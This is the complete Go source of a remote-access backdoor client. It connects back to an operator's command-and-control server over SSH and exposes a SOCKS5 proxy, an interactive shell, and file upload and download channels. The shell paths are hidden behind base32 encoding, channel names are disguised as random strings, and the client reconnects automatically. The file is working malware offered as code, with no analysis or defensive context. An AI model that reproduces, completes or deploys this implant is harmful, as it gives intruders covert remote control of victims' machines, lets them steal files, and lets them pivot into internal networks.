package main

import (
	"bufio"
	"encoding/base32"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"srt/client/go-socks5"
	"time"
)

var (
	chanExit  = make(chan int)
	SSHHost   = ""
	SSHPort   = ""
	SSHUser   = ""
	SSHPwd    = ""
	SocksUser = ""
	SocksPwd  = ""
	Tag       = ""
)

const (
	CHAN_FORWARD   = "RbgEySPMPi"
	CHAN_HEARTBEAT = "uSYeIbUQoR"
	CHAN_COMMAND   = "rIHqXLCqRN"
	CHAN_TRANS     = "SYeILCqrcD"
	COMMAND_KILL   = "aAjcDqEIvI"
	COMMAND_CMD    = "aAjkkqEIvI"
	TRANS_UP       = "zEAYtwDlDr"
	TRANS_DOWN     = "RAsTfZahHD"
)

type Config struct {
	Tag       string
	SSHHost   string
	SSHPort   string
	SSHUser   string
	SSHPwd    string
	SocksUser string
	SocksPwd  string
}

func (c *Config) ServerString() string {
	return fmt.Sprintf("%s:%s", c.SSHHost, c.SSHPort)
}

type Client struct {
	Config     *Config
	SockServer *socks5.Server
	ServerAddr net.Addr
}

func cmdString() string {
	var path = "unknow"
	switch runtime.GOOS {
	case "windows":
		tpath, _ := base32.StdEncoding.DecodeString("IM5FYXCXNFXGI33XONOFYU3ZON2GK3JTGJOFYY3NMQXGK6DF")
		path = string(tpath)
	case "linux":
		tpath, _ := base32.StdEncoding.DecodeString("F5RGS3RPONUA====")
		path = string(tpath)
	case "darwin":
		tpath, _ := base32.StdEncoding.DecodeString("F5RGS3RPONUA====")
		path = string(tpath)
	}
	return path
}

func (c *Client) connect() error {
	var client net.Conn
	var err error
	client, err = net.Dial("tcp", c.Config.ServerString())
	if err != nil {
		return err
	}

	config := &ssh.ClientConfig{
		User:            c.Config.SSHUser,
		Auth:            []ssh.AuthMethod{ssh.Password(c.Config.SSHPwd)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConn, chans, reqs, err := ssh.NewClientConn(client, "", config)
	if err != nil {
		return err
	}

	c.ServerAddr = sshConn.RemoteAddr()
	go ssh.DiscardRequests(reqs)
	c.handleChannels(chans)
	return nil
}

func (c *Client) handleChannels(chans <-chan ssh.NewChannel) {
	for newChannel := range chans {
		go c.handleChannel(newChannel)
	}
}

func (c *Client) handleChannel(newChannel ssh.NewChannel) {
	channel, requests, err := newChannel.Accept()
	if err != nil {
		return
	}
	go ssh.DiscardRequests(requests)
	chanType := newChannel.ChannelType()
	switch chanType {
	case CHAN_FORWARD:
		c.SockServer.ServeConn(channel, c.ServerAddr)
	case CHAN_HEARTBEAT:
		channel.Write([]byte(c.Config.Tag))
		bufConn := bufio.NewReader(channel)
		tcommand := make([]byte, 4)
		for {
			if _, err := bufConn.Read(tcommand); err != nil {
				for {
					err := c.connect()
					if err == nil {
						break
					}
					time.Sleep(3 * time.Second)
				}
				return
			}
		}
	case CHAN_COMMAND:

		bufConn := bufio.NewReader(channel)
		tcommand := make([]byte, 256)
		for {
			n, err := bufConn.Read(tcommand)
			if err != nil {
				return
			}
			command := string(tcommand[:n])
			switch command {
			case COMMAND_KILL:
				chanExit <- 1
				return
			case COMMAND_CMD:
				if cmdString() == "unknow" {
					channel.Close()
					return
				}
				cmd := exec.Command(cmdString())
				cmd.Stdin = channel
				cmd.Stdout = channel
				cmd.Stderr = channel
				cmd.Run()
				channel.Close()
				return
			}

		}
	case CHAN_TRANS:
		bufConn := bufio.NewReader(channel)
		tcommand := make([]byte, 256)
		n, err := bufConn.Read(tcommand)
		if err != nil {
			channel.Close()
			return
		}
		command := string(tcommand[:n])
		if len(command) <= 10 {
			channel.Close()
			return
		}
		cmd := command[:10]
		path := command[10:]
		switch cmd {
		//c&c > client = UP
		case TRANS_UP:
			f, err := os.Create(path)
			defer f.Close()
			if err != nil {
				channel.Close()
				return
			}
			io.Copy(f, channel)
			defer channel.Close()
		// client > c&c = DOWN
		case TRANS_DOWN:
			f, err := os.Open(path)
			if err != nil {
				channel.Close()
				return
			}
			defer f.Close()
			io.Copy(channel, f)
			channel.Close()
		}

	}
}

func (c *Client) startSocks() {
	cred := socks5.StaticCredentials{
		c.Config.SocksUser: c.Config.SocksPwd,
	}
	cator := socks5.UserPassAuthenticator{Credentials: cred}
	conf := &socks5.Config{AuthMethods: []socks5.Authenticator{cator}}
	server, err := socks5.New(conf)
	if err != nil {
		chanExit <- 1
		return
	}
	c.SockServer = server
}

func main() {
	c := &Client{
		Config: &Config{
			SSHHost:   SSHHost,
			SSHPort:   SSHPort,
			SSHUser:   SSHUser,
			SSHPwd:    SSHPwd,
			SocksUser: SocksUser,
			SocksPwd:  SocksPwd,
			Tag:       Tag,
		},
	}
	c.startSocks()
	go func() {
		for {
			err := c.connect()
			if err == nil {
				break
			}
			time.Sleep(3 * time.Second)
		}
	}()

	<-chanExit
}
